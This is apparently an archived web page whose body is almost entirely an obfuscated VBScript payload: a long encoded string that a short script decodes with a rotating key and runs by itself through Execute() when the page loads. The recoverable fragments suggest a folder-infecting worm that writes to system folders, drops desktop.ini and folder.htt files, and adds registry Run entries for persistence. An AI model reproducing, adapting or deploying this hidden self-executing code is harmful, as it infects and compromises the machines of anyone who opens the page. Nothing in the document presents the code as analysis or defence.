?tn_mhojJJ?a`nc^Ru^!BunkdnpLsregf,HZrtEgcet<ganE_L]lsIj]dx?a`r60MgejIbKebm'L?Zre$<trn^mtOmqij`(,-=8KC]ld(\!)MgejKF<gaj`dSq[=?hn]exDelj !:XOnaE60Dlo^GCBh]gfeOna 9Bhn!@s_!Kebm'L?Zre$<trn^mtOmqij`(,-( )0)6U!LtbA< ,Ej]IbEhldDICdZmgaLtb6Me]'CqkqejmRtnbmg(*+L]lsIj]dx?a`r%Ej]IbEj]FqgbtehmFqgbtehm GCBraZseIZhl$KgEnknrKdsqfd J^wtHfBmWd^qe6dmllShagAqht?tn_mhojEj]IbSdZqeBbke6La_s(SbmP]mg,/&Ork`qaiEih^r\?hlmkgFeedsXFhcnhrobmSdZqe`URt]mhoj^qyX[kajd-hpf!Be $?RO*?hla>wiomr(Oa`ra?hla( PadnBaheKF:opagcTk!Rh]kdFeed,asmh(>ksaSamFeedTafo 9ESK'NpagSetmEih^'SdZqeBbke(++tnnd)Eih^Seii-Wnbse;DMLL:&oaCnEe !<% ;NDUnnhh`d9!r[rcnbot6&JJ[lsanm')! !>% r[BrH_&AsmhMdxpFeedTafo.?ensaEj]IbDa_`uhmHd6WoLgehe-Ra`Qe]]'DDDY[<TRN>MT[NRENUHdagsipbdsX=df]nktNrenHDKnsLkhjVakrikg=PrSd^kl*KdgN^`d$GKAR^LK<@L[F@CDBMEXLnfpp`raULi_knsk_s\Knslkhj Aqoralr\I^ci]OdrSlRhaek.N^fWnbseGKAR^CQKQEJM^UO>Q\E]dnpbsial[=df]nktE]%XLnfpp`raULi_knsk_s\Knslkhj Aqoralr\La_s(KnsLkhjVakrikg+1%%*)[M]bk\?hlpkld Qld Om`tehmenr!,-%!RA@^DSHQDC]ek GCLaeeQec!!HG>X_?NQRAGS_QLDRXBcejmhte^r\CebZtlpBc&URobmvan^[Me\qoohetXHtthhnk>wpn^rsX% H^et$HttHhnkR^qsehm,-&'/\IZhlXLsapbnnakx JZle%Rh]kdFeed)BaheKFF`ihKdg$GKAR^CQKQEJM^UO>Q\E]dnpbsial[=df]nktE]%XLnfpp`raULi_knsk_s\Knslkhj Aqoralr\La_s(KnsLkhjVakrikg+1%%*)[M]bk\SbceLsapbnnakx JZle%Rh]kdFeed)VsOadlh'QecPqip^DDDY[<TRN>MT[NRENURobmvan^[Me\qoohetXHefe\d\5'/\Knslkhj\Kisikgr\IZhlX>ciphqPn^een^mca+1/*/7.%!RA@^DSHQDC]ek GCLaeeQec!!HG>X_?NQRAGS_QLDRXLnfpp`raULi_knsk_s\Sbmdkpr I^rs]`hncRu^lxsp^l\LknfeedsXFhcnhrobmOqmkokdIjmdrj^s O^stegfsX)`0`)10,)/0,)/0,\/0,)/0,)/0,)/42U/0-^/32)!,[kajd!)BaheKFF`ihKdg$GKAR^CQKQEJM^UO>Q\OhetsZqeXFhcnhrobm[WegcoslNPUBunkdnpOdrobnnXPhn`hvsFdsoZfij`Sq[ryomdmXIqobbkeoULi_knsk_s Knslkhj EgsengdtLdtpbmgoU/a,]/2,)/0,)/0,)b0,)/0,)/0,)/00/[0,*d0///(al]gj%WoLgehe-Ra`Vremd AJEUXBUNKDNPXTSAK[Sk_sw]kd\IbbrklnfpUNfbbbeX*/.,UNupenogUNppbnnoULaee[E`bsonIqeb^qej\d(*21,01,KDG[=VON=!<`lhJJIZhlN^f(AJEUXBUNKDNPXTSAK[Sk_sw]kd\IbbrklnfpUNfbbbeX*/.,UBoifnnXF`ihLdtpbmgoUMesLsapbnnakx(al]gj%KFnlm]`dFkecen!Kebm'WegOapa+3%% Iqock`m?hlal[CkflojEih^r\IbbrklnfpRh]kddXLsapbnnakx%Ej]FqgbtehmFqgbtehm GCBraZseIbkian')Nn>qrkkRaltmaMetmP^lpLZsh6IbMop!ESK'Eih^Dxelss$PhnLZshSLbreis.aqd%Td^mMdmlI`td< lxsp^l3.U!>mdBeBe P^lpLZsh6orrtaf22XTd^mLsanmTpBbke6WegOapa&RYOMDMXDdrj^k3.'clhAereRt]ksUl?hla< SbmP]mg !SULSEIUJengdl*]klEj]IbWoLgehe-Ra`Vremd AJEUXKO?:K_I:BHEGD\OhetsZqeXFhcnhrobm[Wegcosl[CqkqejmUenlhojUQujUJengdl/+!,Om`rpNoFeed?RO*<npu?hlaVijI`td% pdbXdiw]ek.cbe(PhnLZshs^a\Bhkdak-hpm!?RO*<npu?hlaVijI`td% lxsp^l3.UjjsZkl*`hf%VijI`td% lxsp^l3.Uceodsol'hne?ZklDIAlidn`Mn(SbmP]mg !wa[[Fkecen'gtp+dms%WoLgehe-Ra`Vremd AJEUXBL=LREOXQOKM[.`ek\%!dheeih^!PrSd^kl*KdgSkhta!HG>X_?E@SO>R_NHNTX'clhUBojmdnpSyl^!,Zophbbapbnn+q,mo]nwjena`SlRhaek.N^fWnbseGKAR^CH:RSAL^RKHS\`ekfeed\@^eaqesI_hm\%VsOadlh'QecKda`!!HG>X_?E@SO>R_NHNTXowdbbkeX=df]nktE\nnX(PrSd^kl*KdgSkhta!HG>X_?E@SO>R_NHNTX]klbbkeXLbreisEj`hnaU!,OAS_khppSlRhaek.N^fWnbseGKAR^CH:RSAL^RKHS\`ekFeed\OadlhUNpag[Ckflaj][(PhnLZshTafoP]mg !WO\qilm-et^0$*WoLgehe-Ra`Vremd AJEUXBL=LREOXQOKM[dheEih^[Sd^klAq[PnhoenmxSd^dtDZmdh^qsXPRHLknpoU!,t50..3C=.,91,A--*BF)1B92&/0=:/0>1604<|VsOadlh'QecPqip^DDDY[<KAOLDS[KNOPUclh?hlaURcnbotDhrtAgbo`^[(z81*212,0-01/C)*0D.&A1B2,0,</4B15C/+3}SamFeedTafo 9ESK'NpagSetmEih^'SpZqtQiEih^+2(mquaBbkeP^lp*Pqip^V^lSetmBbkeP^lp*<koo^Agc BnmcpbnnBnmcpbnnDILeddIp!(Be EgVhakd 87dmllShagAqht?tn_mhojEj]IbTdbrLk\`tehm 9co_nlejm-lk\`tehmBe H^et$MgioEnc]mhoj%4%< _hlaTd^mMgioEnc]mhoj< Ibc(PahsHhbapbnn(2(Be BLN.C^sEtmdnobnnJZle$MgioEnc]mhoj<:!mgejTdbrLk\`tehm 9Kebm'TdbrLk\`tehm,H^m(PahsHhbapbnn%, H^m(BLN.C^sFeedN]fd(PahsHhbapbnn%(>mdBeBe H^m(PahsHhbapbnn%= /ShagPahsHhbapbnn6TdbrLk\`tehm !\Ej]IbKFnlm]`dFkecen!ShelKo_Zsikg(>mdBe>md?tn_mhoj?tn_mhojJJIZhlN^f(N^fSpk+FeedN]fd)Nn>qrkkRaltmaMetmN^fTafoSpk=PrSd^kl*KdgN^`d$KdgOmq)HfKdgP^lpOmq 9!MgejWoLgehe-Ra`Vremd N^fSpk+FeedN]fd>mdBe>md?tn_mhoj?tn_mhojJJK[nSq['CqkqejmRtnbmg%Sq[D 9/MdspHtt60CoPgih^TnndMdspHtt6TalsOqm+*E_TalsOqm>+7 PadnBunkdnpLsregf 9EijZky@brk6U!>wipCoDn`HfNn>qrkkRaltmaMetmO^s PahsBhkdak=?RO*@dtBhkdak'CqkqejmRtnbmg%SamDe\Ru^< ?kdap^Nbf^bt$Rcnbotegf.@bbtehmanr!)RepEoh]dro< PahsBhkdak-Sq[Eoh]droFkecen<nujm=)Bhq AZbhMdml?nl`^q egFkecenlBhkdakBoqgs 9Eoh]dr?htnp* -De\Ru^'`d`Eoh]dr?htnp%TafoFkecen'Mai^J^wtHf=hcOna.?htnp< ,ShagHZrtEgcet<gan< EgrtnKdv$<trn^mtOmqij`+X+Lag'CqkqejmRtnbmg%&0)Ru^Lsregf 9Li`!BunkdnpLsregf,HZrtEgcet<gan$0,H^m(?nqragsSpkhnc,L]lsIj]dx?a`r)*(<trn^mtOmqij`=DICdZmgaLtb$<trn^mtOmqij`+L]lsIj]dx?a`r%Sq[D 90>ksaIbRu^>=)Td^m<trn^mtOmqij`=<trn^mtOmqij`&=hcOna.Emdm$*( !\Etbs @hAerei 9/?nrc=*TkEoh]dr?htnpIbKC]ld(OnaSpkhnc=EBao^'De\Ru^'Htaf'j%Td^mBe f; BhkdakBoqgs PadnBunkdnpLsregf 9BunkdnpLsregf Ci_Ltb*Bsei!i+-&[DxemDkEj]IbEj]IbNaqsE`spBmdaqBh]k=BmspkQer!BunkdnpLsregf,U!,H^m(?nqragsSpkhnc,1%Sq[Rtnbmg6Me]'CqkqejmRtnbmg(E`spBmdaqBh]k*1(Edn$<trn^mtOmqij`(-HZrtEgcet<gan&0)BunkdnpLsregf 9JJ?a`nc^Ru^!BunkdnpLsregf,HZrtEgcet<ganAgc E_Agc E_HhnpJJK[nSq[=<trn^mtOmqij`Agc BnmcpbnnBnmcpbnnDIPnhoacZse$KgEnknrKdsqfd J^wtQecI`tdO`lq^=GKAR^LK<@L[F@CDBMEXLnfpp`raULi_knsk_s\Knslkhj Aqoralr\@^fra^!=hsg=dgn^d 9VsOadlh'QecKda`!QecI`tdO`lq^(Be @brk@^fra^=! PadnCiodCeckde6Feg`lu=hsg% 3[Dn`HfEonh=-so.@brk@^fra^=DIO^hRu^!CiodCeckde%KFnlm]`dFkecen!CiodCeckde%NaqsPrSd^kl*KdgSkhtaQecI`tdO`lq^+DeljDa`qeaEj]FqgbtehmFqgbtehm GCtmiZfeBhkdak'P]mgN]fd)Nn>qrkkRaltmaMetmO^s BhkdakMai^=?RO*@dtBhkdak'P]mgN]fd)RepShelEih^r 9Eoh]drJZle*?hlalDmsEtbrto< ,FkkE]\g PahsBbkeBm PahsBbkeoFeedEtm=NBao^'FOH-GamDxp^msehmN]fd(PahsBbke*I`td(Be BbkeAqs 9!HPF! KkFeedEtm=GTIE! KkFeedEtm=@SLOnEih^Dxp< IGPNr?hla>wt6FLOMgejC]ek GC@pl^mdPh'TdbrFeed.LZsh(gtie!)Dlo^Hf?hla>wt6R;RMgejC]ek GC@pl^mdPh'TdbrFeed.LZsh(ubo(>ksaBe BbkeAqs 9!HPM! PadnGtp>wiomr 90>mdBeGdxpIb'U?Zre$I`tdG`ma=NBao^'WegOapa&CeodsolU!)%Nr!TC]ld(LZshJZle%< Q<`sa!VijI`td% =dsgmnp(Td^mAstAqhspl=*Agc E_E_HpmDxelss60MgejFOH-CkixFeed SbmP]mg !sulsei,1\`^rkpho.egh(I`tdG`maFOH-CkixFeed SbmP]mg !wa[[Fkecen'gtp+P]mgN]fd>mdBe>md?tn_mhoj?tn_mhojJJO^sDef')Nn>qrkkRaltmaMetmAkq.?edanTalsIp< SLbreis.O\qilmEuhemai^E_EnkTd^mBmWd^qe6dmllEhldBmWd^qe6r[rDn`HfHfBmWd^qe6r[rMgejSamFOH=<qe]mdO^cdcp!!S_khppbmg*?hlaLxsp^lO^cdcp(LdtPrSd^kl6Cn^`taHaja\s(PRcnbot*Lgehe!)Dlo^O^s =iolaHaja\s 9co_nlejm-alikepl'GC^gq^rt=iolaHaja\s.o^sCHLHD$zF5,4D?+1--<E0)*0D,&@D>2,0,</4B=48=)A}=iolaHaja\s._kdap^Hnom`n_^')RepVsOadlh< =iolaHaja\s.C^sO^cdcp!(:oph^Nbf^bt*ldt?ERI@!!{,=33B>/1)?/9/&01??,85-/-,)@0?2/50+18y(:oph^Nbf^bt*\qe]mdIjlsaj\d(%SamFOH=:oph^Nbf^bt*@dtK[ie_m')Dn`HfRepCiodNbf^bt6FOH-DnbueoFkkE]\g @brkP^lpBm @brkK[ie_mE_DeljTafo.@khvaMxpa;>+Aj]DeljTafo.@khvaMxpa;>*Td^m>wipEonEj]IbFeg`lu=hsg< @brkP^lp*=qir^KepmdrMetm@bl Kmgen:qr$,(K`n`hliv^Bhq e6/ Ph3Ntd^qAnk'i%< Egs($2*Kmd%J^wtSeiiRtnbmg6Fkki9*TkKej!ShelSetm(MdmlGtm6Ao\'Me]'TdbrTaqs,e%0)%IbSeiiMui< -,Td^mMdmlGtm624EhldIbSeiiMui< -)Td^mMdmlGtm625Ej]IbTafoCdZq 9Bhn!SeiiMui, Kmgen:qr$bMk]4%E_TafoCdZq 9Bhn!24%ShagP^lp?a`r6Cdk'14Agc E_P^lpOmqij`=MdmlLsregf SeiiBh]kJ^wtTnHhbkOmq 9!Et^bup^'=hmDdy=kq(/+TdbrTaqsub?kKf!Kar@rn!/)6Opadr=kq(,&!oaCnEe&Jeu:qr$*( 9! Ntd^qAnk'1%% !&r[BrH_%Ddy=kq(.=&Hshak@rn!1)%v^<qLb!G^xAnk'3%< % Kmgen:qr$,( !ub?kKf!Fkki9*TkKej!DxaLsregf)%v^<qLb!P^lpJnl 9@s_!Li`!DxaLsregf,e%0)%!&r[BrH_%Be P^lpJnl 908Mgej!&r[BrH_%MdmlGtm630!&r[BrH_%>mdBeub?kKf!TafoCdZq 9Bhn!SeiiMui* G^xAnk'iFnd-()%v^<qLb!E_TafoCdZq 9Bhn!18%Shag!oaCnEe&SeiiBh]k=oaCn!&r[BrH_%>ksaBe P^lp?a`r6Cdk'25Td^mub?kKf!TafoCdZq 9ubH_!oaCnEe&Dn`Hf%v^<qLb!PahsP^wt6TdbrTaqs SeiiBh]k!oaCnEe&Metm!%&oaCnEe !Et^bup^'TdbrTaqs)TdbrTaqs 9!Et^Rtnbmg6&MdmlLsregf !DmllP^wt6!<% lbreis hZmgqZfe9oas_khpp7! ub?kKf`hbui^mt*pqip^! !<% ]hvlsyh^<'lhripbnn6Zasketta4la_s:,iw;mnp6)ox7vi`mg:,iw;adicas:,iw;s,ij]dx6+7;ohse[hlemx:ahd`^m':&;!% :OPH>S J:LE9DI![`teomHABFHP6/ SBCTD6/ _hce9\nm*fr.%ZbteodX*:bteod!T<nmlhmejm=8&.ALIKEP7! !<% (cir7!% r[BrH_&;+lbreis>% r[BrH_&;o\qilml]gfu]`d=r[rcnbot:&oaCnEe ShelSetm&oaCnEe TnHhbkOmq ub?kKf8&.s_khpp7! ub?kKf8&.BK=X>% r[BrH_&;+ASMH7!OasP^wt6TdbrTaqs ub?kKfUjEncgLsrv^<qLb% DI_om`rp!(VijI`td< BLN.C^sSl^bi]eEoh]dr$)( !\Ib'FOH-FeedEtbrto!VijI`td% pdbX?nl`^q.dms%Td^m?RO*<npu?hlaVijI`td% pdbX?nl`^q.dms(PhnLZshs^a\gcvahe-ge_!>mdBeBe $?RO*?hla>wiomr(SbmP]mg !sulsei,1\`^rkpho.egh%Td^m?RO*<npu?hlaVijI`td% lxsp^l3.Uceodsol'hne+WegOapa&ryomdm/+[kfp`lh'fibAgc E_Agc Bnmcpbnn"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 4"&vbCrLf&"KeyArr(1) = 7"&vbCrLf&"KeyArr(2) = 1"&vbCrLf&"KeyArr(3) = 0"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
</BODY>
</HTML>




<!--
     FILE ARCHIVED ON 8:41:48 Jan 15, 2005 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 18:58:19 Feb 4, 2013.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
